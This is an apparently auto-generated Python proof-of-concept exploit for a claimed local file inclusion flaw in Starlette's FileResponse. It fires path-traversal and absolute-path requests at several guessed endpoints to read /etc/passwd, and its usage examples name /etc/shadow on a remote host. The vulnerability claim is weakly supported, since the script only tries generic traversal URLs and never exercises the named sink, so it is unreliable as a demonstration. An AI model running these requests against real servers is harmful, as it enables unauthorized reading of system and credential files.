#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: lfi-006
# Sink: _handle_single_range
# Auto-generated — run with: python3 lfi_fileresponse_class_uses_self__handle_single_range.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette FileResponse LFI (Local File Inclusion)
Vulnerability: FileResponse uses self.path directly in anyio.open_file() without validation.
If an attacker can control the path (e.g., via URL parameter or request scope), they can read
arbitrary files using absolute paths or path traversal sequences.

This PoC demonstrates reading /etc/passwd (or a benign local file) from a vulnerable Starlette app.
"""

import argparse
import sys
import requests
import os

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"
# Benign file to read (safe default)
DEFAULT_FILE = "/etc/passwd"


def exploit_lfi(target_url: str, file_path: str, timeout: int = 10) -> None:
    """
    Attempt to read a file via the LFI vulnerability in Starlette's FileResponse.

    Args:
        target_url: Base URL of the vulnerable Starlette application
        file_path: Absolute or relative path to the file to read
        timeout: Request timeout in seconds
    """
    # Construct the malicious URL
    # The exact endpoint depends on the application's routing, but we try common patterns:
    # 1. Direct path parameter: /file?path=/etc/passwd
    # 2. Path traversal in URL: /files/../../../etc/passwd
    # 3. Direct file serving endpoint: /static/../../../etc/passwd

    # Try multiple attack vectors
    attack_urls = [
        f"{target_url}/file?path={file_path}",
        f"{target_url}/files/{file_path}",
        f"{target_url}/static/{file_path}",
        f"{target_url}/download?file={file_path}",
        f"{target_url}/media/{file_path}",
        # Direct path traversal in root
        f"{target_url}/{file_path.lstrip('/')}",
    ]

    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {file_path}")
    print()

    for url in attack_urls:
        try:
            print(f"[*] Trying: {url}")
            response = requests.get(url, timeout=timeout, allow_redirects=False)

            if response.status_code == 200 and len(response.content) > 0:
                print(f"[+] SUCCESS! Status: {response.status_code}")
                print(f"[+] Content length: {len(response.content)} bytes")
                print(f"[+] Response headers: {dict(response.headers)}")
                print()
                print("=== FILE CONTENTS ===")
                # Try to decode as text, fall back to hex dump
                try:
                    content = response.content.decode('utf-8', errors='replace')
                    print(content)
                except:
                    print(f"<binary data, first 200 bytes: {response.content[:200].hex()}>")
                print("=== END FILE CONTENTS ===")
                print()
                return
            elif response.status_code == 206:
                # Partial content - also valid for file reads
                print(f"[+] SUCCESS! Status: 206 Partial Content")
                print(f"[+] Content length: {len(response.content)} bytes")
                print()
                print("=== FILE CONTENTS (partial) ===")
                try:
                    content = response.content.decode('utf-8', errors='replace')
                    print(content)
                except:
                    print(f"<binary data, first 200 bytes: {response.content[:200].hex()}>")
                print("=== END FILE CONTENTS ===")
                print()
                return
            else:
                print(f"[-] Status: {response.status_code}, Length: {len(response.content)}")
                if response.status_code == 404:
                    print("    (Endpoint not found or file doesn't exist)")
                elif response.status_code == 403:
                    print("    (Access forbidden)")
                elif response.status_code == 500:
                    print("    (Server error - might be crashing)")

        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error: Could not reach {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout: Request to {url} timed out")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request error: {e}")

        print()

    print("[-] All attack vectors failed. The application may not be vulnerable,")
    print("    or the endpoint structure is different. Try adjusting the target URL.")
    print("    Common vulnerable patterns:")
    print("    - /file?path=/etc/passwd")
    print("    - /files/../../../etc/passwd")
    print("    - /static/../../../etc/passwd")


def main():
    parser = argparse.ArgumentParser(
        description="Starlette FileResponse LFI PoC Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://localhost:8000 -f /etc/passwd
  %(prog)s -t http://vulnerable-app.com -f /etc/shadow
  %(prog)s -t http://vulnerable-app.com -f ../../../etc/passwd
        """
    )
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "-f", "--file",
        default=DEFAULT_FILE,
        help=f"File path to read (default: {DEFAULT_FILE})"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )

    args = parser.parse_args()

    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("[!] Target URL must start with http:// or https://")
        sys.exit(1)

    # Remove trailing slash if present
    target = args.target.rstrip("/")

    print("=" * 60)
    print("Starlette FileResponse LFI Exploit PoC")
    print("=" * 60)
    print()

    exploit_lfi(target, args.file, args.timeout)


if __name__ == "__main__":
    main()
